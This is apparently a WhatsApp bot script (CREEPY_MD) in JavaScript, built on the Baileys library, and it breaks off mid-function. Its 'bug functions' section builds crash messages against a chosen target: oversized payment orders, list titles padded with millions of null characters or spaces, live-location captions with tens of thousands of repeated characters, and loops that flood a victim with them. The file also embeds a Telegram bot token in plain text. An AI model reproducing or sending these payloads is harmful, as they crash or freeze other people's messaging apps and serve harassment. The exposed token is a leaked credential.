//created by Danny
//wa.me/255697608274
//Deploy and enjoy
//Credits (Creepy technology)
//Follow our channel https://whatsapp.com/channel/0029VacQFw65Ui2gGv0Kwk1r

const axios = require('axios');
/*
const { default: makeWASocket, fetchLatestBaileysVersion, downloadContentFromMessage, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs')
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const pino = require('pino')
const readline = require("readline");
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const NodeCache = require('node-cache');

//bug database
const { creepyd1 } = require('./80/creepyd1')
const { creepyd2 } = require('./80/creepyd2')
const { creepyd3 } = require('./80/creepyd3')
const { creepyd4 } = require('./80/creepyd4')
const { creepyd5 } = require('./80/creepyd5')
const { creepyd6 } = require('./80/creepyd6')
const { creepyd7 } = require('./80/creepyd7')
const { creepyd8 } = require('./80/creepyd8')
const { creepyd9 } = require('./80/creepyd9')
const { creepyd10 } = require('./80/creepyd10')
const { creepyd11 } = require('./80/creepyd11')
const wkwk = fs.readFileSync(`./80/x.mp3`)
const xsteek = fs.readFileSync(`./80/x.webp`)
const o = fs.readFileSync(`./80/o.jpg`)

//database
let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))
let antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
//autorep
const VoiceNoteCreepy = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'))
const StickerCreepy = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
const ImageCreepy = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
const VideoCreepy = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))
const DocCreepy = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'))
const ZipCreepy = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
const ApkCreepy = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))

//time
const ctime = moment.tz('Arusha/Tanzania').format('HH:mm:ss')
const cdate = moment.tz('Arusha/Tanzania').format('DD/MM/YYYY')
const time2 = moment().tz('Arusha/Tanzania').format('HH:mm:ss')
if (time2 < "24:59:00") {
    var creepytimewisher = `Good Night 🌌`
}
if (time2 < "17:00:00") {
    var creepytimewisher = `Good Evening 🌃`
}
if (time2 < "18:00:00") {
    var creepytimewisher = `Good Evening 🌃`
}
if (time2 < "13:00:00") {
    var creepytimewisher = `Good Afternoon 🌅`
}
if (time2 < "10:00:00") {
    var creepytimewisher = `Good Morning 🌄`
}
if (time2 < "05:00:00") {
    var creepytimewisher = `Good Morning 🌄`
}
module.exports = DannyTechInc = async (DannyTechInc, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplyglobal.selectedRowId : (m.mtype == 'templateButtonreplyglobalMessage') ? m.message.templateButtonreplyglobalMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplyglobal.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "💀unknown"
        const botNumber = await DannyTechInc.decodeJid(DannyTechInc.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await DannyTechInc.groupMetadata(m.chat).catch(e => { }) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        const clientId = DannyTechInc.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? DannyTechInc.user.id.split(':')[0] + "@s.whatsapp.net" || DannyTechInc.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
        expiredCheck(DannyTechInc, m, premium);
        //group chat msg by danny
        const replyglobal = (teks) => {
            DannyTechInc.sendMessage(m.chat,
                {
                    text: teks,
                    contextInfo: {
                        mentionedJid: [sender],
                        forwardingScore: 9999999,
                        isForwarded: false,
                        "externalAdReply": {
                            "showAdAttribution": true,
                            "containsAutoReply": true,
                            "title": ` ${global.botname}`,
                            "body": `${ownername}`,
                            "previewType": "PHOTO",
                            "thumbnailUrl": ``,
                            "thumbnail": fs.readFileSync(`./DannyMedia/creepy.jpg`),
                            "sourceUrl": `${link}`
                        }
                    }
                },
                { quoted: m })
        }

        async function Telesticker(url) {
            return new Promise(async (resolve, reject) => {
                if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replyglobal('Enther your url telegram sticker link')
                packName = url.replace("https://t.me/addstickers/", "")
                data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, { method: "GET", headers: { "User-Agent": "GoogleBot" } })
                const creepyresult = []
                for (let i = 0; i < data.data.result.stickers.length; i++) {
                    fileId = data.data.result.stickers[i].thumb.file_id
                    data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
                    result = {
                        status: 200,
                        author: 'Danny',
                        url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
                    }
                    creepyresult.push(result)
                }
                resolve(creepyresult)
            })
        }

        //bug functions
        const force = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: "status@broadcast"
                } : {})
            },
            'message': {
                "interactiveMessage": {
                    "header": {
                        "hasMediaAttachment": true,
                        "jpegThumbnail": fs.readFileSync(`./80/xx1.png`)
                    },
                    "nativeFlowMessage": {
                        "buttons": [
                            {
                                "name": "review_and_pay",
                                "buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
                            }
                        ]
                    }
                }
            }
        }

        const force2 = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: "status@broadcast"
                } : {})
            },
            'message': {
                "interactiveMessage": {
                    "header": {
                        "hasMediaAttachment": true,
                        "jpegThumbnail": fs.readFileSync(`./80/xx1.png`)
                    },
                    "nativeFlowMessage": {
                        "buttons": [
                            {
                                "name": "review_and_pay",
                                "buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"ۗ🇹🇿Danny🤖ۗ🇹🇿Danny🤖ۗ🇹🇿Danny🤖\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
                            }
                        ]
                    }
                }
            }
        }

        const oneclickcreep = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: "status@broadcast"
                } : {})
            },
            message: {
                listResponseMessage: {
                    title: `🇹🇿Danny🤖`
                }
            }
        }
        async function blackening(target, kuwoted) {
            var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
                "stickerMessage": {
                    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
                    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
                    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
                    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
                    "mimetype": "image/webp",
                    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
                    "fileLength": "10116",
                    "mediaKeyTimestamp": "1715876003",
                    "isAnimated": false,
                    "stickerSentTs": "1715881084144",
                    "isAvatar": false,
                    "isAiSticker": false,
                    "isLottie": false
                }
            }), { userJid: target, quoted: kuwoted });
            await DannyTechInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
        }

        async function locationcreepy(target, kuwoted) {
            var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
                viewOnceMessage: {
                    message: {
                        "liveLocationMessage": {
                            "degreesLatitude": "p",
                            "degreesLongitude": "p",
                            "caption": `🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖` + "ꦾ".repeat(50000),
                            "sequenceNumber": "0",
                            "jpegThumbnail": ""
                        }
                    }
                }
            }), { userJid: target, quoted: kuwoted })
            await DannyTechInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
        }

        async function creepkillpic(target, kuwoted) {
            var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
                interactiveMessage: {
                    header: {
                        title: "🇹🇿Danny🤖",
                        hasMediaAttachment: true,
                        ...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/f6j3fl.jpeg" } }, { upload: DannyTechInc.waUploadToServer }))
                    },
                    body: {
                        text: ""
                    },
                    footer: {
                        text: "›          #🇹🇿Danny🤖"
                    },
                    nativeFlowMessage: {
                        messageParamsJson: " ".repeat(1000000)
                    }
                }
            }), { userJid: target, quoted: kuwoted });
            await DannyTechInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
        }

        async function aipong(target) {
            await DannyTechInc.relayMessage(target, { "paymentInviteMessage": { serviceType: "FBPAY", expiryTimestamp: Date.now() + 1814400000 } }, { participant: { jid: target } })
        }

        async function listcreepfck(target, kuwoted) {
            var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
                'listMessage': {
                    'title': "🇹🇿Danny🤖" + " ".repeat(92000000),
                    'footerText': `🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖`,
                    'description': `🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖`,
                    'buttonText': null,
                    'listType': 2,
                    'productListInfo': {
                        'productSections': [{
                            'title': 'anjay',
                            'products': [
                                { "productId": "4392524570816732" }
                            ]
                        }],
                        'productListHeaderImage': {
                            'productId': '4392524570816732',
                            'jpegThumbnail': null
                        },
                        'businessOwnerJid': '0@s.whatsapp.net'
                    }
                },
                'footer': 'puki',
                'contextInfo': {
                    'expiration': 604800,
                    'ephemeralSettingTimestamp': "1679959486",
                    'entryPointConversionSource': "global_search_new_chat",
                    'entryPointConversionApp': "whatsapp",
                    'entryPointConversionDelaySeconds': 9,
                    'disappearingMode': {
                        'initiator': "INITIATED_BY_ME"
                    }
                },
                'selectListType': 2,
                'product_header_info': {
                    'product_header_info_id': 292928282928,
                    'product_header_is_rejected': false
                }
            }), { userJid: target, quoted: oneclickcreep });
            await DannyTechInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
        }


        const sendReaction = async reactionContent => {
            DannyTechInc.sendMessage(m.chat, {
                'react': {
                    'text': reactionContent,
                    'key': m.key
                }
            });
        };

        async function sendRepeatedMessages(jid, count) {
            for (let i = 0; i < count; i++) {
                DannyTechInc.sendMessage(recipientJid, {
                    'text': ''.repeat(500000)
                }, {
                    'participant': {
                        'jid': jid
                    },
                    'messageId': etc.key.id
                }, {
                    'quoted': m
                });
            }
        }

        async function sendViewOnceMessages(jid, count) {
            for (let i = 0; i < count; i++) {
                let messageContent = generateWAMessageFromContent(jid, {
                    'viewOnceMessage': {
                        'message': {
                            'messageContextInfo': {
                                'deviceListMetadata': {},
                                'deviceListMetadataVersion': 2
                            },
                            'interactiveMessage': proto.Message.InteractiveMessage.create({
                                'body': proto.Message.InteractiveMessage.Body.create({
                                    'text': ''
                                }),
                                'footer': proto.Message.InteractiveMessage.Footer.create({
                                    'text': ''
                                }),
                                'header': proto.Message.InteractiveMessage.Header.create({
                                    'title': '',
                                    'subtitle': '',
                                    'hasMediaAttachment': false
                                }),
                                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    'buttons': [{
                                        'name': "cta_url",
                                        'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
                                    }],
                                    'messageParamsJson': "\0".repeat(100000)
                                })
                            })
                        }
                    }
                }, {});
                DannyTechInc.relayMessage(jid, messageContent.message, {
                    'messageId': messageContent.key.id
                });
            }
        }

        async function sendSystemCrashMessage(jid) {
            var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
                'viewOnceMessage': {
                    'message': {
                        'interactiveMessage': {
                            'header': {
                                'title': '',
                                'subtitle': " "
                            },
                            'body': {
                                'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
                            },
                            'footer': {
                                'text': 'xp'
                            },
                            'nativeFlowMessage': {
                                'buttons': [{
                                    'name': 'cta_url',
                                    'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
                                }],
                                'messageParamsJson': "\0".repeat(100000)
                            }
                        }
                    }
                }
            }), {
                'userJid': jid
            });
            await DannyTechInc.relayMessage(jid, messageContent.message, {
                'participant': {
                    'jid': jid
                },
                'messageId': messageContent.key.id
            });
        }
        async function sendListMessage(jid) {
            var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
                'listMessage': {
                    'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(9200000),
                    'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
                    'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
                    'buttonText': null,
                    'listType': 2,
                    'productListInfo': {
                        'productSections': [{
                            'title': "lol",
                            'products': [{
                                'productId': "4392524570816732"
                            }]
                        }],
                        'productListHeaderImage': {
                            'productId': "4392524570816732",
                            'jpegThumbnail': null
                        },
                        'businessOwnerJid': "0@s.whatsapp.net"
                    }
                },
                'footer': "lol",
                'contextInfo': {
                    'expiration': 600000,
                    'ephemeralSettingTimestamp': "1679959486",
                    'entryPointConversionSource': "global_search_new_chat",
                    'entryPointConversionApp': "whatsapp",
                    'entryPointConversionDelaySeconds': 9,
                    'disappearingMode': {
                        'initiator': "INITIATED_BY_ME"
                    }
                },
                'selectListType': 2,
                'product_header_info': {
                    'product_header_info_id': 292928282928,
                    'product_header_is_rejected': false
                }
            }), {
                'userJid': jid
            });

            await DannyTechInc.relayMessage(jid, messageContent.message, {
                'participant': {
                    'jid': jid
                },
                'messageId': messageContent.key.id
            });
        }

        async function sendLiveLocationMessage(jid) {
            var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
                'viewOnceMessage': {
                    'message': {
                        'liveLocationMessage': {
                            'degreesLatitude': 'p',
                            'degreesLongitude': 'p',
                            'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
                            'sequenceNumber': '0',
                            'jpegThumbnail': ''
                        }
                    }
                }
            }), {
                'userJid': jid
            });

            await DannyTechInc.relayMessage(jid, messageContent.message, {
                'participant': {
                    'jid': jid
                },
                'messageId': messageContent.key.id
            });
        }

        async function sendExtendedTextMessage(jid) {
            DannyTechInc.relayMessage(jid, {
                'extendedTextMessage': {
                    'text': '.',
                    'contextInfo': {
                        'stanzaId': jid,
                        'participant': jid,
                        'quotedMessage': {
                            'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
                        },
                        'disappearingMode': {
                            'initiator': "CHANGED_IN_CHAT",
                            'trigger': "CHAT_SETTING"
                        }
                    },
                    'inviteLinkGroupTypeV2': "DEFAULT"
                }
            }, {
                'participant': {
                    'jid': jid
                }
            }, {
                'messageId': null
            });
        }
        async function sendPaymentInvite(jid) {
            DannyTechInc.relayMessage(jid, {
                'paymentInviteMessage': {
                    'serviceType': "UPI",
                    'expiryTimestamp': Date.now() + 86400000
                }
            }, {
                'participant': {
                    'jid': jid
                }
            });
        }

        async function sendMultiplePaymentInvites(jid, count) {
            for (let i = 0; i < count; i++) {
                sendPaymentInvite(jid);
                sendExtendedTextMessage(jid);
                await sleep(500);
            }
        }

        async function sendVariousMessages(jid, count) {
            for (let i = 0; i < count; i++) {
                sendListMessage(jid);
                sendLiveLocationMessage(jid);
                sendSystemCrashMessage(jid);
                await sleep(500);
            }
        }

        async function sendRepeatedMessages2(jid, count) {
            for (let i = 0; i < count; i++) {
                sendSystemCrashMessage(jid);
                sendSystemCrashMessage(jid);
                sendSystemCrashMessage(jid);
                await sleep(500);
            }
        }

        async function sendMixedMessages(jid, count) {
            for (let i = 0; i < count; i++) {
                sendLiveLocationMessage(jid);
                sendListMessage(jid);
                await sleep(500);
            }
        }

        function sendMessageWithMentions(text, mentions = [], quoted = false) {
            if (quoted == null || quoted == undefined || quoted == false) {
                return DannyTechInc.sendMessage(m.chat, {
                    'text': text,
                    'mentions': mentions
                }, {
                    'quoted': m
                });
            } else {
                return DannyTechInc.sendMessage(m.chat, {
                    'text': text,
                    'mentions': mentions
                }, {
                    'quoted': m
                });
            }
        }

        const cbug2 = {
            key: {
                remoteJid: 'status@broadcast',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                listResponseMessage: {
                    title: botname
                }
            }
        }

        const fakeflow = {
            key: {
                remoteJid: 'status@broadcast',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            'message': {
                "interactiveMessage": {
                    "header": {
                        "hasMediaAttachment": true,
                        "jpegThumbnail": bimg
                    },
                    "nativeFlowMessage": {
                        "buttons": [
                            {
                                "name": "review_and_pay",
                                "buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
                            }
                        ]
                    }
                }
            }
        };

        const creepimun = (texto) => {
            DannyTechInc.sendMessage(from, { text: texto, mentions: [sender] }, { quoted: m }).catch(e => {
                return reply("Erro..")
            })
        }

        const subscribe_Danny = {
            "key": {
                "fromMe": false,
                "participant": '0@s.whatsapp.net',
                "remoteJid": 'status@broadcast'
            },
            message: {
                "listResponseMessage": {
                    title: `Danny's ur father`
                }
            }
        }
        async function creepyCrashy(dgcreep, chat) {
            DannyTechInc.sendMessage(chat, {
                document: { url: './settings.js' },
                mimetype: `image/null`,
                fileName: `${creepy}.${creepyd1}`,
                caption: `${creepy + creepyd1}`,
            }, { quoted: subscribe_dgcreep })
        }
        //end bug functions

        async function loading() {
            var creeplod = [
                "《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
                "《 ████▒▒▒▒▒▒▒▒》30%",
                "《 ███████▒▒▒▒▒》50%",
                "《 ██████████▒▒》80%",
                "《 ████████████》100%",
                "𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🤖....."
            ]
            let { key } = await DannyTechInc.sendMessage(from, { text: 'ʟᴏᴀᴅɪɴɢ...' })

            for (let i = 0; i < creeplod.length; i++) {
                await DannyTechInc.sendMessage(from, { text: creeplod[i], edit: key });
            }
        }

        if (!DannyTechInc.public) {
            if (!isCreator && !m.key.fromMe) return
        }

        if (autoread) {
            DannyTechInc.readMessages([m.key])
        }

        if (global.autoTyping) {
            DannyTechInc.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
            DannyTechInc.sendPresenceUpdate('recording', from)
        }


        //bot number online status, available=online, unavailable=offline
        DannyTechInc.sendPresenceUpdate('uavailable', from)

        if (global.autorecordtype) {
            let creeprecordin = ['recording', 'composing']
            let creeprecordinfinal = creeprecordin[Math.floor(Math.random() * creeprecordin.length)]
            DannyTechInc.sendPresenceUpdate(creeprecordinfinal, from)

        }

        if (autobio) {
            DannyTechInc.updateProfileStatus(`CREEPY_MD-V1 online By ${ownername}`).catch(_ => _)
        }
        if (m.sender.startsWith('91') && global.anti91 === true) {
            return DannyTechInc.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
            list.push({
                displayName: await DannyTechInc.getName(i),
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await DannyTechInc.getName(i)}\nFN:${await DannyTechInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
            })
        }

        //chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
            console.log(chalk.green(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
            console.log(chalk.green(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
        }

        for (let Bhosdikacreep of VoiceNotecreep) {
            if (budy === Bhosdikacreep) {
                let audiobuffy = fs.readFileSync(`./GlobalMedia/audio/${Bhosdikacreep}.mp3`)
                DannyTechInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
            }
        }
        for (let Bhosdikacreep of Stickercreep) {
            if (budy === Bhosdikacreep) {
                let stickerbuffy = fs.readFileSync(`./GlobalMedia/sticker/${Bhosdikacreep}.webp`)
                DannyTechInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
